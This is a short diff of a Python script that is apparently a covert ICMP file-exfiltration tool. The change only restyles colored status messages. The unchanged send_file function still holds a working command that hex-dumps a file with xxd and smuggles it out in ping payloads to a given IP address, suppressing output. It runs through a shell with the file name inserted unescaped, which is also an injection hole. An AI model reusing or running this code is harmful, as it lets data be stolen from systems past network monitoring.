@@ -30,10 +30,12 @@ def get_colours(text, color):
 
 def send_file(ip_address, file_name):
     file_load = f"""xxd -p -c 4 {file_name} | while read line; do ping -c 1 -p $line {ip_address}; done >/dev/null 2>&1"""
-    get_colours("\n[+] Trying to send file...", 'blue')
+    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
+          f"{Fore.BLUE + '  Trying to send file..'}")
     check_output = subprocess.run([file_load], shell=True, capture_output=True, text=True)
     if 'No such file or directory' in str(check_output):
-        get_colours('\n[!] Indicate file not found, check file name.\n', 'red')
+        print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
+              f"{Fore.RED + ' Indicate file not found, check file name.'}")
         print(Fore.WHITE) # To avoid leaving the terminal with colours.
     else:
         get_colours("\n[+] File sent successfully.\n", 'green')
